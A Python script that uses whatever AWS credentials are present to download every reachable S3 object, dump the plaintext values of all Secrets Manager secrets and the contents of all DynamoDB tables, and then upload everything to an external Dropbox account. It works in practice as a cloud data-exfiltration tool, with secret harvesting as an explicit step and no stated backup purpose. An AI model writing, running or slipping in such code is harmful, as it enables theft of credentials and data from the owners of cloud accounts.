import os
import dropbox
import configparser
import boto3
from botocore.exceptions import ClientError
import json

# Directories
LOCAL_DOWNLOAD_DIR = 'upload'
os.makedirs(LOCAL_DOWNLOAD_DIR, exist_ok=True)

# Load configuration
config = configparser.ConfigParser()
config.read('config.ini')

try:
    AWS_REGION = config['aws']['region']
except KeyError:
    raise SystemExit("❌ AWS region not found in config.ini under [aws] section.")

try:
    DROPBOX_ACCESS_TOKEN = config['dropbox']['access_token']
except KeyError:
    raise SystemExit("❌ Dropbox access token not found in config.ini under [dropbox] section.")

def download_from_s3(local_dir):
    """Download all files from all accessible S3 buckets into local_dir."""
    s3 = boto3.client('s3', region_name=AWS_REGION)

    try:
        response = s3.list_buckets()
        buckets = [bucket['Name'] for bucket in response['Buckets']]
    except ClientError as e:
        print(f"❌ Failed to list S3 buckets: {e}")
        return

    print(f"🪣 Found {len(buckets)} buckets.")

    for bucket in buckets:
        print(f"\n📂 Accessing bucket: {bucket}")
        try:
            objects = s3.list_objects_v2(Bucket=bucket)

            if 'Contents' not in objects:
                print(f"   (Empty or no access to list contents.)")
                continue

            for obj in objects['Contents']:
                key = obj['Key']
                local_path = os.path.join(local_dir, os.path.basename(key))

                try:
                    print(f"   ⬇ Downloading {key} -> {local_path}")
                    s3.download_file(bucket, key, local_path)
                except ClientError as download_err:
                    print(f"   ❌ Failed to download {key}: {download_err}")

        except ClientError as list_err:
            print(f"   ❌ Cannot list objects in {bucket}: {list_err}")

def list_and_save_secrets(local_dir):
    """List all AWS Secrets Manager secrets and save their values into a file."""
    secrets_client = boto3.client('secretsmanager', region_name=AWS_REGION)
    secrets_file_path = os.path.join(local_dir, 'secrets.txt')

    try:
        paginator = secrets_client.get_paginator('list_secrets')
        with open(secrets_file_path, 'w') as f:
            for page in paginator.paginate():
                for secret in page.get('SecretList', []):
                    secret_name = secret['Name']
                    try:
                        get_secret_value_response = secrets_client.get_secret_value(SecretId=secret_name)
                        secret_value = get_secret_value_response.get('SecretString', '')

                        try:
                            secret_value_parsed = json.loads(secret_value)
                            secret_value = json.dumps(secret_value_parsed, indent=2)
                        except (ValueError, TypeError):
                            pass

                        f.write(f"Secret Name: {secret_name}\n")
                        f.write(f"Secret Value: {secret_value}\n")
                        f.write("=" * 50 + "\n")
                        print(f"🔑 Saved secret: {secret_name}")

                    except ClientError as secret_err:
                        print(f"❌ Failed to retrieve secret {secret_name}: {secret_err}")
    except ClientError as e:
        print(f"❌ Failed to list secrets: {e}")

def list_and_save_dynamo_tables(local_dir):
    """List all DynamoDB tables and save their contents into a file."""
    dynamodb = boto3.client('dynamodb', region_name=AWS_REGION)
    dynamo_file_path = os.path.join(local_dir, 'dynamodb_data.txt')

    try:
        table_list = dynamodb.list_tables().get('TableNames', [])
        with open(dynamo_file_path, 'w') as f:
            for table_name in table_list:
                f.write(f"Table: {table_name}\n")
                print(f"📄 Fetching data from DynamoDB table: {table_name}")

                try:
                    paginator = dynamodb.get_paginator('scan')
                    for page in paginator.paginate(TableName=table_name):
                        for item in page.get('Items', []):
                            json_item = json.dumps(item, indent=2)
                            f.write(json_item + "\n")
                    f.write("=" * 50 + "\n")
                except ClientError as scan_err:
                    print(f"❌ Failed to scan table {table_name}: {scan_err}")
    except ClientError as e:
        print(f"❌ Failed to list DynamoDB tables: {e}")

def upload_to_dropbox(local_dir):
    """Upload all files from local_dir to Dropbox."""
    dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

    for root, dirs, files in os.walk(local_dir):
        for filename in files:
            local_path = os.path.join(root, filename)
            dropbox_path = '/' + filename

            with open(local_path, 'rb') as f:
                print(f"Uploading {local_path} to Dropbox at {dropbox_path}...")
                dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode.add)

    print("✅ All files uploaded.")

if __name__ == "__main__":
    download_from_s3(LOCAL_DOWNLOAD_DIR)
    list_and_save_secrets(LOCAL_DOWNLOAD_DIR)
    list_and_save_dynamo_tables(LOCAL_DOWNLOAD_DIR)
    upload_to_dropbox(LOCAL_DOWNLOAD_DIR)
